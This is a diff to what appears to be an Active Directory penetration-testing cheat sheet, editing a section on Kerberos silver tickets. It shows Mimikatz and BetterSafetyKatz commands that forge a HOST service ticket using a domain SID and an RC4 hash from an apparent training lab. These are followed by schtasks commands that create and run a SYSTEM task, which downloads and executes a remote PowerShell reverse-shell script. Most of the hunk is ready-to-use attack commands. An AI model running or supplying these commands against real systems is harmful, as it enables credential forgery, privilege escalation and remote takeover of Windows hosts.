@@ -126,16 +126,19 @@ Invoke-Mimikatz -Command '"kerberos::golden /domain:dom.local /sid:S-1-5... /tar
 * Target is the host from where whe have the service account hash
 * Using "cifs" service for later access the filesystem of the Server
 * Using "host" service allows to schedule tasks then on the target host
-* List of SPN which can be used: https://adsecurity.org/?page\_id=183&#x20;
+* List of SPN which can be used: https://adsecurity.org/?page\_id=183
+* Get-DomainSID for the current domain SID
 {% endhint %}
 
 **Schedudle an execute a task with silver ticket of "HOST" Service**
 
 <pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell">Invoke-Mimikatz -Command '"kerberos:golden /domain:dom.local /sid:S-1-5... /target:target-dc.local /service:host /rc4:hash /user:Administrator /ptt"'
 
-<strong>schtasks /create /S hostname.dom.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "STCheck" /TR "powershell.exe -c 'iex (new-object net.webclient).DownloadString(''http://ip/Invoke_powerShellTcp.ps1''')'"
+C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:1e16be70054d1c5999aa53994e03e59c /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
+
+<strong>schtasks /create /S hostname.dom.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "NameYourScheduledTask" /TR "powershell.exe -c 'iex (new-object net.webclient).DownloadString(''http://ip/Invoke_powerShellTcp.ps1''')'"
 </strong><strong>
-</strong>schtasks /Run /S hostname.dom.local /TN "STCheck"
+</strong>schtasks /Run /S hostname.dom.local /TN "NameYourScheduledTask"
 </code></pre>
 
 {% hint style="info" %}
